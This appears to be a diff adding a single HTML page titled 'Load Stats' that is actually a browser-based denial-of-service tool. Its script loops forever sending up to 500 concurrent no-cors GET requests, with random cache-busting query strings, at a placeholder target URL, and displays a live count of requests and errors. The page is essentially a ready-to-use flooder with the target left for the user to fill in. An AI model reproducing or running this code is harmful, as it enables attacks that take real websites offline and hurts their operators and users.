@@ -1,0 +1,124 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <title>Load Stats</title>
+    <style>
+        body {
+            background-color: #1a1a1a;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        #stats {
+            width: 80%;
+            max-width: 800px;
+            background: #2d2d2d;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            text-align: center;
+        }
+
+        th {
+            border-bottom: 2px solid #444;
+            padding: 10px;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+        }
+
+        td {
+            padding: 15px;
+            border-bottom: 1px solid #383838;
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        #errors {
+            color: #ff5555;
+            margin-top: 10px;
+        }
+    </style>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-RM2JZ4FQQJ');
+    </script>
+</head>
+<body>
+    <div id="stats"></div>
+    <div id="errors"></div>
+
+    <script>
+        var targets = {
+            'YOUR TARGET (With https:// or http://)': { number_of_requests: 0, number_of_errored_responses: 0 },
+        }
+
+        var statsEl = document.getElementById('stats');
+        function printStats() {
+            statsEl.innerHTML = '<table><thead><tr><th>Web</th><th>Requests</th><th>Errors</th></tr></thead><tbody>' + 
+                Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) => 
+                '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + 
+                '</tbody></table>'
+        }
+        setInterval(printStats, 1000);
+
+        var CONCURRENCY_LIMIT = 500
+        var queue = []
+
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                method: 'GET',
+                mode: 'no-cors',
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+
+        async function flood(target) {
+            for (var i = 0;; ++i) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift()
+                }
+                rand = i % 3 === 0 ? '' : ('?' + Math.random() * 2000)
+                queue.push(
+                    fetchWithTimeout(target+rand, { timeout: 1000 })
+                        .catch((error) => {
+                            if (error.code === 20) return;
+                            targets[target].number_of_errored_responses++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                targets[target].number_of_errored_responses++;
+                            }
+                            targets[target].number_of_requests++;
+                        })
+                )
+            }
+        }
+        Object.keys(targets).map(flood)
+    </script>
+</body>
+</html>
